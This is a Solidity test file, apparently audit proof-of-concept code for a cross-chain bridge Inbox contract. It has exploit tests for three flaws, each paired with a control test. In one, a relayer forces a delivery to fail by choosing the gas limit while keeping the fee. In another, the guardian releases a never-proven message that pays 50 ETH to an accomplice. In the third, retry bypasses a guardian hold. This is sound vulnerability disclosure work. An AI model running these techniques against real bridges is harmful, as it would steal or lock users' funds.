// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Proof} from "proof/Proof.sol";
import {Inbox, IProver} from "../src/Inbox.sol";

contract MockProver is IProver {
    mapping(bytes32 => bool) public proven;
    function mark(bytes32 h) external { proven[h] = true; }
}

// A destination contract whose message needs a lot of gas and which has no code path that calls Inbox.retry.
contract HeavyVault {
    mapping(uint256 => uint256) public slots;
    uint256 public deposits;
    function deposit() external payable {
        for (uint256 i = 0; i < 60; i++) slots[i] = i + 1;   // ~1.3M gas of work
        deposits += msg.value;
    }
}

// A recipient that fails its first delivery and can call retry itself.
contract Recipient {
    bool public open;
    uint256 public got;
    function setOpen(bool o) external { open = o; }
    function take() external payable { require(open, "closed"); got += msg.value; }
    function retry(Inbox inbox, Inbox.Message calldata m) external { inbox.retry(m); }
    receive() external payable {}
}

contract InboxProof is Proof {
    MockProver prover;
    Inbox inbox;
    address guardian = address(0x6A);
    address relayer = address(0xFEE);
    address accomplice = address(0xBAD);

    function setUp() public {
        vm.warp(1_000_000);
        prover = new MockProver();
        inbox = new Inbox(IProver(address(prover)), guardian);
        vm.deal(address(inbox), 100 ether);            // escrow backing bridged messages
        vm.deal(relayer, 1 ether);                     // relayers are funded accounts
    }

    function _h(Inbox.Message memory m) internal pure returns (bytes32) { return keccak256(abi.encode(m)); }

    // Issue 1: the relayer picks the transaction's gas; with a large gasLimit the call receives only 63/64 of what is
    // left, so a relayer can make it run out of gas while process completes, takes the fee, and marks the message failed.
    function test_issue1_relayerForcesFailureAndKeepsFee() public {
        HeavyVault vault = new HeavyVault();
        Inbox.Message memory m = Inbox.Message(1, address(vault), 5 ether, 0.1 ether, 2_000_000, abi.encodeCall(HeavyVault.deposit, ()));
        prover.mark(_h(m));
        inbox.prove(_h(m));
        vm.warp(block.timestamp + 1 hours);
        bytes memory call = abi.encodeCall(Inbox.process, (m));
        bool found;
        for (uint256 g = 100_000; g < 3_000_000; g += 10_000) {
            vm.prank(relayer);
            (bool ok,) = address(inbox).call{gas: g}(call);
            if (ok) { found = true; break; }
        }
        assertTrue(found, "some gas limit lets process succeed");
        assertEq(relayer.balance, 1.1 ether, "relayer collected the fee");
        assertEq(vault.deposits(), 0, "the 5 ETH deposit never reached the vault");
        vm.expectRevert();
        inbox.process(m);                               // cannot be processed again
        vm.expectRevert();
        inbox.retry(m);                                 // only the vault may retry, and it has no code to do so
        assertEq(address(inbox).balance, 100 ether - 0.1 ether, "the 5 ETH stays stuck in the inbox");
    }

    // Control for issue 1: with enough gas the same message is delivered.
    function test_control_enoughGasDelivers() public {
        HeavyVault vault = new HeavyVault();
        Inbox.Message memory m = Inbox.Message(1, address(vault), 5 ether, 0.1 ether, 2_000_000, abi.encodeCall(HeavyVault.deposit, ()));
        prover.mark(_h(m));
        inbox.prove(_h(m));
        vm.warp(block.timestamp + 1 hours);
        vm.prank(relayer);
        inbox.process{gas: 3_000_000}(m);
        assertEq(vault.deposits(), 5 ether, "delivered");
    }

    // Issue 2: hold(h, false) writes a fresh timestamp into the same slot that records proof, so the guardian
    // can make a never-proven message processable.
    function test_issue2_guardianReleaseMakesUnprovenMessageProcessable() public {
        Inbox.Message memory m = Inbox.Message(7, accomplice, 50 ether, 0, 0, "");
        assertTrue(!prover.proven(_h(m)), "the source chain never sent this message");
        vm.prank(guardian);
        inbox.hold(_h(m), false);
        vm.warp(block.timestamp + 1 hours);
        vm.prank(relayer);
        inbox.process(m);
        assertEq(accomplice.balance, 50 ether, "an unproven message paid out 50 ETH");
    }

    // Control for issue 2: without the guardian's call, an unproven message cannot be processed.
    function test_control_unprovenMessageRejected() public {
        Inbox.Message memory m = Inbox.Message(7, accomplice, 50 ether, 0, 0, "");
        vm.warp(block.timestamp + 1 hours);
        vm.expectRevert();
        inbox.process(m);
    }

    // Issue 3: retry does not check the hold, so a failed message the guardian has held back still executes.
    function test_issue3_retryIgnoresGuardianHold() public {
        Recipient r = new Recipient();
        Inbox.Message memory m = Inbox.Message(9, address(r), 20 ether, 0, 200_000, abi.encodeCall(Recipient.take, ()));
        prover.mark(_h(m));
        inbox.prove(_h(m));
        vm.warp(block.timestamp + 1 hours);
        vm.prank(relayer);
        inbox.process(m);                               // first delivery fails: recipient closed
        assertEq(r.got(), 0, "failed first time");
        vm.prank(guardian);
        inbox.hold(_h(m), true);                        // guardian holds the message back
        r.setOpen(true);
        r.retry(inbox, m);
        assertEq(r.got(), 20 ether, "a held message executed through retry");
    }

    // Control for issue 3: a held message cannot go through process.
    function test_control_heldMessageBlockedInProcess() public {
        Inbox.Message memory m = Inbox.Message(10, accomplice, 1 ether, 0, 0, "");
        prover.mark(_h(m));
        inbox.prove(_h(m));
        vm.prank(guardian);
        inbox.hold(_h(m), true);
        vm.warp(block.timestamp + 2 hours);
        vm.expectRevert();
        inbox.process(m);
    }
}
